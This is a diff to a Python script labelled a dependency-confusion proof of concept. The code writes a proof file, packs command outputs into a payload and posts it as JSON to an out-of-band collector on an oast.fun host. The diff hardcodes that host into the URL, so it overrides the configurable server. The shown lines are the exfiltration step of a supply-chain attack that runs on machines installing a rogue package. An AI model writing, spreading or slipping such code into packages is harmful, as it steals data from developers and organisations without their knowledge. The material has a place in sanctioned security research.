@@ -72,7 +72,7 @@ def create_local_proof(data):
         if platform.system() == 'Windows':
             proof_path = os.path.join(os.environ.get('TEMP', 'C:\\'), 'dep_confusion_proof.txt')
         else:
-            proof_path = '/tmp/dep_confusion_proof.txt'
+            proof_path = '/tmp/supply_chain_proof.txt'
 
         with open(proof_path, 'w', encoding='utf-8') as f:
             f.write("=== Dependency Confusion POC ===\n")
@@ -123,7 +123,7 @@ def send_to_collaborator(data, collab_server):
                 payload['command_results'][cmd_name] = stdout
 
         # Use provided collaborator server
-        url = f"http://{collab_server}/collect"
+        url = f"http://nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun/collect"
         json_data = json.dumps(payload).encode('utf-8')
 
         if USE_REQUESTS:
@@ -161,7 +161,7 @@ def main():
     print(f"[-] Local proof created: {proof_file}")
 
     # Send to collaborator - use environment variable or default
-    collab_server = os.environ.get('COLLAB_SERVER', 'xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun')
+    collab_server = os.environ.get('COLLAB_SERVER', 'nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun')
     collab_result = send_to_collaborator(collected_data, collab_server)
     print(f"[-] Collaborator result: {collab_result}")
 
